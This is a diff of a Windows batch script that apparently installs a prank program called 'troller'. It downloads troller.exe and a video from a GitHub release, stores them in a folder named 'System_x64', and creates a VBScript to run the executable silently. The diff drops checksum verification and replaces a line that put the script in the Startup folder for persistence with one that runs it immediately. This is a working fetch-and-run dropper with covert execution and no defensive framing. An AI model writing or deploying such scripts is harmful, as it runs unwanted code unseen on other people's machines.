@@ -10,7 +10,7 @@ if not exist "%DOWNLOAD_FOLDER%" (
 
 :: download the executable and the video file
 curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%DOWNLOAD_FOLDER%\troller.exe"
-curl -L "https://github.com/vexnity/troller-revamped/raw/main/troll%20in%20suit.mp4" -o "%DOWNLOAD_FOLDER%\troll_in_suit.mp4"
+curl -L "https://github.com/vexnity/troller-revamped/raw/main/troll%20in%20suit.mp4" -o "%DOWNLOAD_FOLDER%\troll in suit.mp4"
 
 :: check if the files are downloaded
 if exist "%DOWNLOAD_FOLDER%\troller.exe" (
@@ -20,20 +20,10 @@ if exist "%DOWNLOAD_FOLDER%\troller.exe" (
     exit /b 1
 )
 
-if exist "%DOWNLOAD_FOLDER%\troll_in_suit.mp4" (
-    echo troll_in_suit.mp4 downloaded successfully.
+if exist "%DOWNLOAD_FOLDER%\troll in suit.mp4" (
+    echo troll in suit.mp4 downloaded successfully.
 ) else (
-    echo Failed to download troll_in_suit.mp4.
-    exit /b 1
-)
-
-:: verify the checksum of the video file (example checksum)
-certutil -hashfile "%DOWNLOAD_FOLDER%\troll_in_suit.mp4" SHA256
-set VIDEO_CHECKSUM=SHA256 CHECKSUM GOES HERE
-
-:: replace this line with the actual checksum for verification
-if not "%VIDEO_CHECKSUM%" == "EXPECTED CHECKSUM" (
-    echo Video file checksum does not match.
+    echo Failed to download troll in suit.mp4.
     exit /b 1
 )
 
@@ -60,7 +50,7 @@ timeout /t 5 /nobreak
 tasklist /fi "imagename eq troller.exe"
 
 :: ensure the VBScript runs at startup
-move "%VBS_FILE%" "%STARTUP_FOLDER%"
+cscript //nologo "%VBS_FILE%"
 
 echo Files have been moved to System_x64 folder, VBScript created to run troller.exe silently, and executed.
 pause
